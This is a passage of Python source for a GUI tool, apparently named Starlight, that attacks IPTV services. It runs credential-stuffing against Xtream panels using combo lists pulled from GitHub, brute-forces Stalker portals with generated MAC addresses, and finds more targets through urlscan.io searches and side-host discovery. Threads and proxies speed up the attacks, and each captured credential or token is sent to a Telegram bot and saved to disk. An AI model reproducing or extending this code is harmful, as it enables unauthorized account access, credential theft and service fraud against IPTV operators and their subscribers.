        self.us_query.pack(side="left", padx=8)
        self.us_query.bind("<Return>", lambda e: self._urlscan_search())
        ctk.CTkButton(sr, text="Search", width=80, fg_color="#f59e0b", hover_color="#fbbf24",
                      text_color="#000", command=self._urlscan_search).pack(side="left", padx=2)
        ctk.CTkButton(sr, text="→ Xtream", width=90, fg_color="#059669", hover_color="#10b981",
                      command=self._urlscan_to_xtream).pack(side="left", padx=2)
        ctk.CTkButton(sr, text="→ Stalker", width=90, fg_color="#0891b2", hover_color="#06b6d4",
                      command=self._urlscan_to_stalker).pack(side="left", padx=2)
        ctk.CTkButton(sr, text="Smart Send", width=100, fg_color="#8b5cf6", hover_color="#a78bfa",
                      command=self._urlscan_smart_send).pack(side="left", padx=2)
        # Presets
        pr = ctk.CTkFrame(tab, fg_color="transparent")
        pr.pack(fill="x", pady=(0,4))
        presets = [("Xtream URL", 'page.url:"player_api.php"'),("Stalker URL", 'page.url:"stalker_portal"'),
                   ("XUI Panel", 'page.title:"XUI"'),("All Hashes","ALL_HASHES")]
        for name, q in presets:
            ctk.CTkButton(pr, text=name, width=90, height=26, font=ctk.CTkFont(size=10),
                          fg_color="#374151", hover_color="#4b5563",
                          command=lambda qr=q: self._urlscan_preset(qr)).pack(side="left", padx=2)
        # API key row
        kr = ctk.CTkFrame(tab, fg_color="transparent")
        kr.pack(fill="x", pady=(0,4))
        ctk.CTkLabel(kr, text="API Key:", text_color="#64748b", font=ctk.CTkFont(size=10)).pack(side="left")
        self.us_apikey = ctk.CTkEntry(kr, width=300, placeholder_text="Optional urlscan.io API key")
        self.us_apikey.pack(side="left", padx=6)
        self.us_status = ctk.CTkLabel(kr, text="", text_color="#6ee7b7", font=ctk.CTkFont(size=10))
        self.us_status.pack(side="left", padx=8)
        # Results tree
        rf = ctk.CTkFrame(tab, fg_color="#0d0d1e", corner_radius=8)
        rf.pack(fill="both", expand=True)
        us_cols = ("type","url","title","ip","date")
        self.us_tree = ttk.Treeview(rf, columns=us_cols, show="headings",
                                     height=10, style="Hits.Treeview")
        self.us_tree.heading("type", text="TYPE")
        self.us_tree.heading("url", text="URL")
        self.us_tree.heading("title", text="TITLE")
        self.us_tree.heading("ip", text="IP")
        self.us_tree.heading("date", text="DATE")
        self.us_tree.column("type", width=70, anchor="center")
        self.us_tree.column("url", width=320)
        self.us_tree.column("title", width=180)
        self.us_tree.column("ip", width=120)
        self.us_tree.column("date", width=80)
        vsb = ttk.Scrollbar(rf, orient="vertical", command=self.us_tree.yview)
        self.us_tree.configure(yscrollcommand=vsb.set)
        self.us_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb.pack(side="right", fill="y")
        self.us_tree.bind("<Double-1>", self._urlscan_open)
        self.us_tree.bind("<Button-3>", self._urlscan_rightclick)
        self.us_results = []

    def _build_settings_tab(self):
        tab = self.tabview.tab("Settings")
        f = ctk.CTkFrame(tab, fg_color="transparent")
        f.pack(padx=20, pady=10, anchor="nw", fill="x")
        settings = [
            ("Threads:", "set_threads", "50", 80),
            ("Timeout (s):", "set_timeout", "5", 80),
            ("Ports:", "set_ports", ",".join(map(str,DEFAULT_PORTS)), 400),
            ("Telegram Token:", "set_tg_token", "", 350),
            ("Telegram Chat ID:", "set_tg_chat", "", 200),
        ]
        for i,(label, attr, default, width) in enumerate(settings):
            ctk.CTkLabel(f, text=label, text_color="#a5b4fc",
                         font=ctk.CTkFont(size=11)).grid(row=i, column=0, sticky="w", pady=6, padx=(0,12))
            entry = ctk.CTkEntry(f, width=width, placeholder_text=default if not default else None)
            if default: entry.insert(0, default)
            entry.grid(row=i, column=1, sticky="w", pady=6)
            setattr(self, attr, entry)
        # Side host toggle
        r = len(settings)
        ctk.CTkLabel(f, text="Side Host Scan:", text_color="#a5b4fc",
                     font=ctk.CTkFont(size=11)).grid(row=r, column=0, sticky="w", pady=6, padx=(0,12))
        self.side_host_enabled = ctk.CTkSwitch(f, text="Discover side hosts on hits",
                                                onvalue=True, offvalue=False)
        self.side_host_enabled.grid(row=r, column=1, sticky="w", pady=6)
        self.side_host_enabled.select()  # On by default
        # Proxy section
        r += 1
        ctk.CTkLabel(f, text="", text_color="#a5b4fc").grid(row=r, column=0, pady=4)
        r += 1
        proxy_frame = ctk.CTkFrame(tab, fg_color="#0f0f24", corner_radius=10)
        proxy_frame.pack(fill="both", expand=True, padx=20, pady=(8,10))
        phdr = ctk.CTkFrame(proxy_frame, fg_color="transparent")
        phdr.pack(fill="x", padx=10, pady=(8,2))
        ctk.CTkLabel(phdr, text="Proxies (optional)", font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#f59e0b").pack(side="left")
        self.proxy_count_label = ctk.CTkLabel(phdr, text="0 loaded", font=ctk.CTkFont(size=10),
                                               text_color="#64748b")
        self.proxy_count_label.pack(side="left", padx=10)
        ctk.CTkButton(phdr, text="Load .txt", width=70, height=24, font=ctk.CTkFont(size=10),
                      fg_color="#3730a3", hover_color="#4f46e5",
                      command=self._load_proxies_file).pack(side="right", padx=2)
        ctk.CTkButton(phdr, text="Clear", width=50, height=24, font=ctk.CTkFont(size=10),
                      fg_color="#374151", hover_color="#4b5563",
                      command=self._clear_proxies).pack(side="right", padx=2)
        self.proxy_text = ctk.CTkTextbox(proxy_frame, height=80, font=ctk.CTkFont(family="Consolas", size=10),
                                          fg_color="#080816", text_color="#e2e8f0")
        self.proxy_text.pack(fill="both", expand=True, padx=8, pady=(4,8))

    def _build_log(self):
        lf = ctk.CTkFrame(self, fg_color="#080810", corner_radius=10, height=130)
        lf.pack(fill="x", padx=10, pady=(3,8))
        lf.pack_propagate(False)
        hdr = ctk.CTkFrame(lf, fg_color="transparent")
        hdr.pack(fill="x", padx=10, pady=(6,0))
        ctk.CTkLabel(hdr, text="LIVE LOG", font=ctk.CTkFont(size=10, weight="bold"),
                     text_color="#4b5563").pack(side="left")
        ctk.CTkButton(hdr, text="Clear", width=50, height=20, font=ctk.CTkFont(size=9),
                      fg_color="#374151", hover_color="#4b5563",
                      command=lambda: self.log_text.configure(state="normal") or self.log_text.delete("1.0","end") or self.log_text.configure(state="disabled")).pack(side="right")
        self.log_text = ctk.CTkTextbox(lf, font=ctk.CTkFont(family="Consolas", size=10),
                                        fg_color="#050510", text_color="#6ee7b7",
                                        state="disabled", wrap="none")
        self.log_text.pack(fill="both", expand=True, padx=8, pady=(4,8))


    # ── Helpers ──
    def _log(self, msg):
        self.log_queue.put(msg)

    def _load_proxies_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text","*.txt"),("CSV","*.csv"),("All","*.*")])
        if path:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            self.proxy_text.delete("1.0","end")
            self.proxy_text.insert("1.0", content)
            count = load_proxies(content)
            self.proxy_count_label.configure(text=f"{count} loaded")
            self._log(f"Loaded {count} proxies")

    def _clear_proxies(self):
        global _proxy_list
        self.proxy_text.delete("1.0","end")
        _proxy_list = []
        self.proxy_count_label.configure(text="0 loaded")
        self._log("Proxies cleared")

    def _fetch_github_combos(self):
        """Fetch combo list names from GitHub, show picker dialog."""
        self._log("Fetching combo list from GitHub...")
        threading.Thread(target=self._fetch_github_worker, daemon=True).start()

    def _fetch_github_worker(self):
        combos = fetch_github_combos()
        if not combos:
            self._log("GitHub: No combo files found")
            return
        self._log(f"GitHub: Found {len(combos)} combo files")
        # Show picker on main thread
        self.after(0, lambda: self._show_combo_picker(combos))

    def _show_combo_picker(self, combos):
        """Show a popup window with checkboxes to pick which combo files to load."""
        picker = ctk.CTkToplevel(self)
        picker.title("GitHub Combos - Select to Load")
        picker.geometry("500x450")
        picker.transient(self)
        picker.grab_set()
        picker.configure(fg_color="#0d0d1e")

        ctk.CTkLabel(picker, text=f"Found {len(combos)} combo files",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#f59e0b").pack(pady=(12,4))
        ctk.CTkLabel(picker, text="Select which files to download and add to combos:",
                     font=ctk.CTkFont(size=10), text_color="#64748b").pack(pady=(0,8))

        # Scrollable frame for checkboxes
        scroll = ctk.CTkScrollableFrame(picker, fg_color="#111127", corner_radius=8)
        scroll.pack(fill="both", expand=True, padx=12, pady=(0,8))

        checkboxes = {}
        for name, url in combos.items():
            var = ctk.BooleanVar(value=False)
            cb = ctk.CTkCheckBox(scroll, text=name, variable=var,
                                  font=ctk.CTkFont(family="Consolas", size=11),
                                  text_color="#e2e8f0", fg_color="#4f46e5",
                                  hover_color="#6366f1")
            cb.pack(anchor="w", pady=2, padx=4)
            checkboxes[name] = (var, url)

        # Buttons
        bf = ctk.CTkFrame(picker, fg_color="transparent")
        bf.pack(fill="x", padx=12, pady=(0,12))
        ctk.CTkButton(bf, text="Select All", width=90, height=30,
                      fg_color="#374151", hover_color="#4b5563",
                      command=lambda: [v.set(True) for v, _ in checkboxes.values()]).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="Deselect All", width=90, height=30,
                      fg_color="#374151", hover_color="#4b5563",
                      command=lambda: [v.set(False) for v, _ in checkboxes.values()]).pack(side="left", padx=4)
        ctk.CTkButton(bf, text="Load Selected", width=120, height=30,
                      font=ctk.CTkFont(weight="bold"),
                      fg_color="#059669", hover_color="#10b981",
                      command=lambda: self._download_selected_combos(checkboxes, picker)).pack(side="right", padx=4)
        ctk.CTkButton(bf, text="Cancel", width=70, height=30,
                      fg_color="#dc2626", hover_color="#ef4444",
                      command=picker.destroy).pack(side="right", padx=4)

    def _download_selected_combos(self, checkboxes, picker):
        """Download selected combo files and add to combos textbox."""
        selected = {name: url for name, (var, url) in checkboxes.items() if var.get()}
        if not selected:
            self._log("No combo files selected")
            return
        picker.destroy()
        self._log(f"Downloading {len(selected)} combo files...")
        threading.Thread(target=self._download_combos_worker, args=(selected,), daemon=True).start()

    def _download_combos_worker(self, selected):
        all_lines = []
        for name, url in selected.items():
            try:
                r = requests.get(url, timeout=20, headers={"User-Agent":"Mozilla/5.0"})
                if r.status_code == 200:
                    lines = [l.strip() for l in r.text.strip().split("\n") if l.strip() and ":" in l]
                    all_lines.extend(lines)
                    self._log(f"GitHub: {name} → {len(lines)} combos")
            except Exception as e:
                self._log(f"GitHub: Failed {name}: {e}")
        unique = list(dict.fromkeys(all_lines))
        self._log(f"GitHub: Total {len(unique)} unique combos from {len(selected)} files")
        self.after(0, lambda: self._insert_github_combos(unique))

    def _insert_github_combos(self, combos):
        current = self.xt_combos.get("1.0","end").strip()
        existing = set(current.split("\n")) if current else set()
        new_combos = [c for c in combos if c not in existing]
        if new_combos:
            if current:
                self.xt_combos.insert("end", "\n" + "\n".join(new_combos))
            else:
                self.xt_combos.insert("1.0", "\n".join(new_combos))
            self._log(f"Added {len(new_combos)} new combos to list")

    def _add_dns(self):
        dns = self.xt_dns_entry.get().strip()
        if dns:
            current = self.xt_hosts.get("1.0","end").strip()
            if current: self.xt_hosts.insert("end", "\n" + dns)
            else: self.xt_hosts.insert("1.0", dns)
            self.xt_dns_entry.delete(0, "end")

    def _add_stalker_dns(self):
        dns = self.sk_dns_entry.get().strip()
        if dns:
            current = self.sk_hosts.get("1.0","end").strip()
            if current: self.sk_hosts.insert("end", "\n" + dns)
            else: self.sk_hosts.insert("1.0", dns)
            self.sk_dns_entry.delete(0, "end")

    def _load_file(self, widget):
        path = filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])
        if path:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                widget.delete("1.0","end")
                widget.insert("1.0", f.read())

    def _get_ports(self):
        try: return [int(p.strip()) for p in self.set_ports.get().split(",") if p.strip().isdigit()]
        except: return DEFAULT_PORTS

    def _poll_loop(self):
        # Drain log queue
        batch = []
        while not self.log_queue.empty():
            batch.append(self.log_queue.get_nowait())
        if batch:
            self.log_text.configure(state="normal")
            for msg in batch:
                self.log_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
            self.log_text.see("end")
            self.log_text.configure(state="disabled")
        # Update stats
        if self.running_xtream or self.running_stalker:
            elapsed = time.time() - self.start_time if self.start_time else 0
            # Xtream stats
            xt_speed = self.scanned_xt / elapsed if elapsed > 0 else 0
            self.stat_labels["XT Targets"].configure(text=str(self.total_xt))
            self.stat_labels["XT Scanned"].configure(text=str(self.scanned_xt))
            xt_hits = len([h for h in self.hits if h.get("type") == "xtream"])
            self.stat_labels["XT Hits"].configure(text=str(xt_hits))
            self.stat_labels["XT Speed"].configure(text=f"{xt_speed:.1f}/s")
            self.stat_labels["Elapsed"].configure(text=f"{int(elapsed//60)}:{int(elapsed%60):02d}")
            # ETA based on combined progress
            total = self.total_xt + self.total_sk
            scanned = self.scanned_xt + self.scanned_sk
            total_speed = scanned / elapsed if elapsed > 0 else 0
            remaining = total - scanned
            eta = remaining / total_speed if total_speed > 0 else 0
            self.stat_labels["ETA"].configure(text=f"{int(eta//60)}:{int(eta%60):02d}")
            # Stalker stats - show row if stalker is active or has data
            if self.running_stalker or self.total_sk > 0:
                self._show_stalker_stats(True)
                sk_speed = self.scanned_sk / elapsed if elapsed > 0 else 0
                self.stat_labels["SK Targets"].configure(text=str(self.total_sk))
                self.stat_labels["SK Scanned"].configure(text=str(self.scanned_sk))
                sk_hits = len([h for h in self.hits if h.get("type") == "stalker"])
                self.stat_labels["SK Hits"].configure(text=str(sk_hits))
                self.stat_labels["SK Speed"].configure(text=f"{sk_speed:.1f}/s")
                self.stat_labels["Total Hits"].configure(text=str(len(self.hits)))
            else:
                self._show_stalker_stats(False)
            # Progress bar
            pct = scanned / total if total > 0 else 0
            self.progress.set(pct)
            # Status
            parts = []
            if self.running_xtream: parts.append("XTREAM")
            if self.running_stalker: parts.append("STALKER")
            self.status_label.configure(text="● SCANNING " + "+".join(parts), text_color="#fbbf24")
        elif self.hits:
            self.status_label.configure(text=f"● DONE - {len(self.hits)} hits", text_color="#34d399")
        self.hit_count_label.configure(text=f"{len(self.hits)} hits")
        self.after(250, self._poll_loop)

    # ── Scan Control ──
    def start_xtream(self):
        if self.running_xtream: return
        raw = [h.strip() for h in self.xt_hosts.get("1.0","end").strip().split("\n") if h.strip()]
        combos = [c.strip() for c in self.xt_combos.get("1.0","end").strip().split("\n") if c.strip()]
        if not raw: messagebox.showwarning("Error","Enter at least one host."); return
        if not combos: messagebox.showwarning("Error","Enter at least one combo."); return
        # Parse hosts - each entry can have its own port (host:port)
        # Result: list of (host, [ports]) tuples
        default_ports = self._get_ports()
        host_port_list = []
        seen = set()
        for h in raw:
            h = h.replace("http://","").replace("https://","").split("/")[0].strip()
            if ":" in h:
                parts = h.split(":")
                hostname = parts[0]
                try:
                    specific_port = int(parts[1])
                    ports_for_host = [specific_port]
                except:
                    ports_for_host = default_ports
            else:
                hostname = h
                ports_for_host = default_ports
            if hostname and hostname not in seen:
                seen.add(hostname)
                host_port_list.append((hostname, ports_for_host))
        if not host_port_list: return
        threads = int(self.set_threads.get() or 50)
        timeout = int(self.set_timeout.get() or 5)
        # Calculate total: sum of (ports * combos) for each host
        self.total_xt = sum(len(ports) * len(combos) for _, ports in host_port_list)
        self.scanned_xt = 0
        self.running_xtream = True
        self.stop_xtream = False
        if not self.running_stalker: self.start_time = time.time()
        # Load proxies from settings if any
        proxy_content = self.proxy_text.get("1.0","end").strip()
        if proxy_content:
            count = load_proxies(proxy_content)
            self._log(f"Using {count} proxies")
        threading.Thread(target=self._run_xtream, args=(host_port_list,combos,threads,timeout), daemon=True).start()

    def start_stalker(self):
        if self.running_stalker: return
        raw = [h.strip() for h in self.sk_hosts.get("1.0","end").strip().split("\n") if h.strip()]
        if not raw: messagebox.showwarning("Error","Enter at least one host."); return
        # Parse hosts - each can have its own port
        default_ports = self._get_ports()
        host_port_list = []
        seen = set()
        for h in raw:
            h = h.replace("http://","").replace("https://","").split("/")[0].strip()
            if ":" in h:
                parts = h.split(":")
                hostname = parts[0]
                try:
                    specific_port = int(parts[1])
                    ports_for_host = [specific_port]
                except:
                    ports_for_host = default_ports
            else:
                hostname = h
                ports_for_host = default_ports
            if hostname and hostname not in seen:
                seen.add(hostname)
                host_port_list.append((hostname, ports_for_host))
        if not host_port_list: return
        threads = int(self.set_threads.get() or 50)
        timeout = int(self.set_timeout.get() or 8)
        mac_count = min(max(int(self.sk_mac_count.get() or 1000), 1), 500000)
        self.total_sk = sum(mac_count * len(ports) for _, ports in host_port_list)
        self.scanned_sk = 0
        self.running_stalker = True
        self.stop_stalker = False
        if not self.running_xtream: self.start_time = time.time()
        # Load proxies from settings if any
        proxy_content = self.proxy_text.get("1.0","end").strip()
        if proxy_content:
            count = load_proxies(proxy_content)
            self._log(f"Using {count} proxies")
        threading.Thread(target=self._run_stalker, args=(host_port_list,threads,timeout,mac_count), daemon=True).start()

    def stop_scan(self):
        self.stop_xtream = True
        self.stop_stalker = True
        self._log("STOP ALL requested")

    def stop_xtream_scan(self):
        self.stop_xtream = True
        self._log("STOP XTREAM requested")

    def stop_stalker_scan(self):
        self.stop_stalker = True
        self._log("STOP STALKER requested")

    def _run_xtream(self, host_port_list, combos, threads, timeout):
        total_hosts = len(host_port_list)
        total_ports = sum(len(p) for _, p in host_port_list)
        self._log(f"Xtream: {total_hosts} hosts x {len(combos)} combos = {self.total_xt} checks")
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = []
            for host, ports in host_port_list:
                for port in ports:
                    for combo in combos:
                        if self.stop_xtream: break
                        parts = combo.split(":",1)
                        if len(parts) != 2: self.scanned_xt += 1; continue
                        u, p = parts[0].strip(), parts[1].strip()
                        if not u: self.scanned_xt += 1; continue
                        futs.append(pool.submit(self._xt_worker, host, port, u, p, timeout))
                    if self.stop_xtream: break
                if self.stop_xtream: break
            for f in as_completed(futs):
                if self.stop_xtream: break
                try: f.result()
                except: pass
        self.running_xtream = False
        self._log(f"Xtream done. {len([h for h in self.hits if h.get('type')=='xtream'])} hits.")

    def _xt_worker(self, host, port, user, pw, timeout):
        if self.stop_xtream: return
        hit = check_xtream(host, port, user, pw, timeout)
        self.scanned_xt += 1
        if hit:
            self.hits.append(hit)
            self._log(f"HIT! {host}:{port} {user}:{pw} exp:{hit['exp']}")
            self.after(0, self._add_xt_hit, hit)
            self._send_tg(hit)
            self._auto_save_hit(hit)
            # Side host discovery in background
            if self.side_host_enabled.get():
                threading.Thread(target=self._discover_sides, args=(host,port), daemon=True).start()
            _play_cash_sound()

    def _run_stalker(self, host_port_list, threads, timeout, mac_count):
        self._log(f"Stalker: {len(host_port_list)} hosts x {mac_count} MACs")
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = []
            for host, ports in host_port_list:
                if self.stop_stalker: break
                for port in ports:
                    if self.stop_stalker: break
                    for _ in range(mac_count):
                        if self.stop_stalker: break
                        futs.append(pool.submit(self._sk_worker, host, port, timeout))
                        if len(futs) >= 5000:
                            for f in as_completed(futs):
                                if self.stop_stalker: break
                                try: f.result()
                                except: pass
                            futs = []
            for f in as_completed(futs):
                if self.stop_stalker: break
                try: f.result()
                except: pass
        self.running_stalker = False
        self._log(f"Stalker done. {len([h for h in self.hits if h.get('type')=='stalker'])} hits.")

    def _sk_worker(self, host, port, timeout):
        if self.stop_stalker: return
        mac = gen_mac()
        self.after(0, lambda m=mac: self.sk_mac_label.configure(text=m))
        hit = check_stalker_single(host, port, mac, timeout)
        self.scanned_sk += 1
        if hit:
            self.hits.append(hit)
            self._log(f"STALKER HIT! {host}:{port} MAC:{hit['mac']}")
            self.after(0, self._add_sk_hit, hit)
            self._send_tg(hit)
            self._auto_save_hit(hit)
            # Side host discovery in background
            if self.side_host_enabled.get():
                threading.Thread(target=self._discover_sides, args=(host,port), daemon=True).start()
            _play_cash_sound()

    def _add_xt_hit(self, h):
        self.xt_tree.insert("","end", values=(
            h["host"], h["port"], h["user"], h["pw"],
            h["exp"], h["days"]+"d" if h["days"] and h["days"]!="?" else "?",
            h["mc"], h["m3u"][:80]))

    def _add_sk_hit(self, h):
        channels = f"L:{h.get('live','0')} V:{h.get('vod','0')} S:{h.get('series','0')}"
        self.sk_tree.insert("","end", values=(
            h["host"], h["port"], h["mac"], h.get("exp",""),
            channels, h.get("mc",""), h["portal"][:80]))

    def _discover_sides(self, host, port):
        """Background side host discovery - adds found hosts to xtream tab. Skips if already checked."""
        if host in self._side_hosts_checked:
            return  # Already looked up this host
        self._side_hosts_checked.add(host)
        try:
            sides = discover_side_hosts(host, log_func=self._log)
            if sides:
                self._log(f"Side hosts for {host}: {len(sides)} found → adding to Xtream hosts")
                new_hosts = "\n".join([f"{s}:{port}" for s in sides])
                self.after(0, lambda: self._append_side_hosts(new_hosts))
                try:
                    hits_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "starlight_hits")
                    os.makedirs(hits_dir, exist_ok=True)
                    safe_host = host.replace(":","_").replace("/","_")
                    with open(os.path.join(hits_dir, f"{safe_host}_side_hosts.txt"), "a", encoding="utf-8") as f:
                        for s in sides:
                            f.write(f"{s}:{port}\n")
                except: pass
        except Exception as e:
            self._log(f"Side host error for {host}: {e}")

    def _append_side_hosts(self, new_hosts):
        """Append discovered side hosts to xtream hosts textbox (runs on main thread)."""
        current = self.xt_hosts.get("1.0","end").strip()
        # Avoid duplicates
        existing = set(current.split("\n")) if current else set()
        to_add = [h for h in new_hosts.split("\n") if h.strip() and h.strip() not in existing]
        if to_add:
            if current:
                self.xt_hosts.insert("end", "\n" + "\n".join(to_add))
            else:
                self.xt_hosts.insert("1.0", "\n".join(to_add))


    # ── Telegram ──
    def _send_tg(self, hit):
        token = self.set_tg_token.get().strip()
        chat = self.set_tg_chat.get().strip()
        if not token or not chat: return
        try:
            if hit["type"] == "xtream":
                msg = f"Starlight HIT\nHost: {hit['host']}:{hit['port']}\nUser: {hit['user']}\nPass: {hit['pw']}\nExp: {hit['exp']} ({hit['days']}d)\nM3U: {hit['m3u']}"
            else:
                msg = f"Stalker HIT\nPortal: {hit['portal']}\nMAC: {hit['mac']}\nToken: {hit['token'][:30]}"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                         json={"chat_id":chat,"text":msg,"disable_web_page_preview":True}, timeout=10)
        except: pass

    # ── Auto-save ──
    def _auto_save_hit(self, hit):
        try:
            hits_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "starlight_hits")
            os.makedirs(hits_dir, exist_ok=True)
            host = hit.get("host","unknown").replace(":","_").replace("/","_")
            if hit["type"] == "xtream":
                with open(os.path.join(hits_dir, f"{host}_xtream.txt"), "a", encoding="utf-8") as f:
                    f.write(f"{hit['host']}:{hit['port']} | {hit['user']}:{hit['pw']} | exp:{hit['exp']} ({hit['days']}d) | MC:{hit['mc']} | {hit['m3u']}\n")
            else:
                with open(os.path.join(hits_dir, f"{host}_stalker.txt"), "a", encoding="utf-8") as f:
                    f.write(f"{hit['host']}:{hit['port']} | MAC:{hit['mac']} | exp:{hit.get('exp','')} | L:{hit.get('live','')} V:{hit.get('vod','')} S:{hit.get('series','')} | {hit['portal']}\n")
        except: pass

    # ── Export ──
    def export_hits(self):
        if not self.hits: messagebox.showinfo("Empty","No hits to export."); return
        path = filedialog.asksaveasfilename(defaultextension=".txt",
                                           filetypes=[("Text","*.txt")],
                                           initialfile=f"starlight_hits_{len(self.hits)}.txt")
        if not path: return
        self._write_hits_file(path)
        messagebox.showinfo("Saved", f"Saved {len(self.hits)} hits to:\n{path}")

    def auto_save_hits(self):
        if not self.hits: messagebox.showinfo("Empty","No hits to save."); return
        hits_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "starlight_hits")
        os.makedirs(hits_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(hits_dir, f"hits_{ts}_{len(self.hits)}.txt")
        self._write_hits_file(path)
        self._log(f"Saved {len(self.hits)} hits to: {path}")
        messagebox.showinfo("Saved", f"Saved to:\n{path}")

    def _write_hits_file(self, path):
        with open(path, "w", encoding="utf-8") as f:
            for h in self.hits:
                if h["type"] == "xtream":
                    f.write(f"[XTREAM]\nHost: {h['host']}:{h['port']}\nUser: {h['user']}\nPass: {h['pw']}\nExpiry: {h['exp']}\nDays: {h['days']}\nMC: {h['mc']}\nM3U: {h['m3u']}\n{'='*50}\n")
                else:
                    f.write(f"[STALKER]\nPortal: {h['portal']}\nHost: {h['host']}:{h['port']}\nMAC: {h['mac']}\nExp: {h.get('exp','')}\nMC: {h.get('mc','')}\nL:{h.get('live','')} V:{h.get('vod','')} S:{h.get('series','')}\nToken: {h['token'][:50]}\n{'='*50}\n")

    def clear_hits(self):
        self.hits = []
        for item in self.xt_tree.get_children(): self.xt_tree.delete(item)
        for item in self.sk_tree.get_children(): self.sk_tree.delete(item)
        # Reset all stats and UI
        self.scanned_xt = 0
        self.scanned_sk = 0
        self.total_xt = 0
        self.total_sk = 0
        self.start_time = 0
        self.stat_labels["XT Targets"].configure(text="0")
        self.stat_labels["XT Scanned"].configure(text="0")
        self.stat_labels["XT Hits"].configure(text="0")
        self.stat_labels["XT Speed"].configure(text="0/s")
        self.stat_labels["Elapsed"].configure(text="0:00")
        self.stat_labels["ETA"].configure(text="...")
        self.stat_labels["SK Targets"].configure(text="0")
        self.stat_labels["SK Scanned"].configure(text="0")
        self.stat_labels["SK Hits"].configure(text="0")
        self.stat_labels["SK Speed"].configure(text="0/s")
        self.stat_labels["Total Hits"].configure(text="0")
        self._show_stalker_stats(False)
        self.progress.set(0)
        self.status_label.configure(text="● IDLE", text_color="#34d399")
        # Clear log
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
        # Clear host/combo inputs
        self.xt_hosts.delete("1.0", "end")
        self.xt_combos.delete("1.0", "end")
        self.sk_hosts.delete("1.0", "end")
        self._side_hosts_checked.clear()

    # ── URLScan ──
    def _urlscan_preset(self, query):
        if query == "ALL_HASHES":
            self.us_status.configure(text="Searching all hashes...")
            threading.Thread(target=self._urlscan_all_hashes, daemon=True).start()
        else:
            self.us_query.delete(0, "end")
            self.us_query.insert(0, query)
            self._urlscan_search()

    def _urlscan_search(self):
        query = self.us_query.get().strip()
        if not query: return
        key = self.us_apikey.get().strip()
        self.us_status.configure(text="Searching...", text_color="#fbbf24")
        threading.Thread(target=self._urlscan_worker, args=(query, key), daemon=True).start()

    def _urlscan_worker(self, query, key):
        try:
            hdrs = {"User-Agent":"Mozilla/5.0","Accept":"application/json"}
            if key and len(key) > 10: hdrs["API-Key"] = key
            r = requests.get("https://urlscan.io/api/v1/search/",
                            params={"q":query,"size":100}, headers=hdrs, timeout=20, verify=False)
            if r.status_code == 200:
                results = r.json().get("results", [])
                self.us_results = []
                for res in results:
                    page = res.get("page",{})
                    tk_d = res.get("task",{})
                    url_found = tk_d.get("url", page.get("url",""))
                    self.us_results.append({"url":url_found or f"http://{page.get('domain','')}/",
                                           "title":page.get("title","")[:50],
                                           "ip":page.get("ip",""),
                                           "date":tk_d.get("time","")[:10]})
                self.after(0, self._urlscan_display)
                self.after(0, lambda: self.us_status.configure(text=f"{len(self.us_results)} results", text_color="#6ee7b7"))
            elif r.status_code == 429:
                self.after(0, lambda: self.us_status.configure(text="Rate limited - wait 30s", text_color="#ef4444"))
            else:
                self.after(0, lambda: self.us_status.configure(text=f"HTTP {r.status_code}", text_color="#ef4444"))
        except Exception as e:
            self.after(0, lambda: self.us_status.configure(text=f"Error: {e}", text_color="#ef4444"))

    def _urlscan_all_hashes(self):
        hashes = [
            "df4a5acbc3cf53adcba519160ebca020ed119028c679363769ae792a36e647ac",
            "ddc80a46f200944ca11e37a81dbfc8f616ebe0f952231d5ed497f7e720acb506",
            "e815af35ce94b3ca94a557c434032084663d3059ed8a10f594be7f968c40a501",
            "db350797cbda902ab47fb91960b77934108100ff40c22755f2c6a7432b4b36a6",
        ]
        key = self.us_apikey.get().strip()
        hdrs = {"User-Agent":"Mozilla/5.0","Accept":"application/json"}
        if key and len(key) > 10: hdrs["API-Key"] = key
        all_results, seen = [], set()
        for i, h in enumerate(hashes):
            self.after(0, lambda i=i: self.us_status.configure(text=f"Hash {i+1}/{len(hashes)}..."))
            try:
                r = requests.get("https://urlscan.io/api/v1/search/",
                                params={"q":f"hash:{h}","size":100}, headers=hdrs, timeout=20, verify=False)
                if r.status_code == 200:
                    for item in r.json().get("results",[]):
                        pg = item.get("page",{})
                        dom = pg.get("domain","")
                        if dom and dom not in seen:
                            seen.add(dom)
                            tk_d = item.get("task",{})
                            all_results.append({"url":tk_d.get("url",pg.get("url","")),
                                               "title":pg.get("title","")[:50],
                                               "ip":pg.get("ip",""),
                                               "date":tk_d.get("time","")[:10]})
                elif r.status_code == 429:
                    time.sleep(60)
            except: pass
            time.sleep(5)
        self.us_results = all_results
        self.after(0, self._urlscan_display)
        self.after(0, lambda: self.us_status.configure(text=f"{len(all_results)} unique hosts", text_color="#6ee7b7"))

    def _urlscan_display(self):
        for item in self.us_tree.get_children(): self.us_tree.delete(item)
        for r in self.us_results:
            url = r["url"].lower()
            title = r.get("title","").lower()
            ptype = ""
            # Stalker indicators
            if any(s in url for s in ["stalker","/c/","load.php","portal.php","/mag/","/stb/"]): ptype="STALKER"
            elif any(s in title for s in ["stalker","ministra","portal","mag"]): ptype="STALKER"
            # Xtream indicators
            elif any(s in url for s in ["player_api","get.php","xui","xtream","panel_api"]): ptype="XTREAM"
            elif any(s in title for s in ["xui","xtream","iptv panel"]): ptype="XTREAM"
            # Port-based guess
            elif any(p in url for p in [":25461",":8080",":8880",":2082",":25500"]): ptype="XTREAM"
            elif any(p in url for p in [":8000",":80/"]) and "/c/" in url: ptype="STALKER"
            # If still unknown, guess by common patterns
            if not ptype:
                import urllib.parse
                parsed = urllib.parse.urlparse(url if "://" in url else "http://"+url)
                port = parsed.port
                if port in (25461, 25500, 8880, 2082): ptype = "XTREAM"
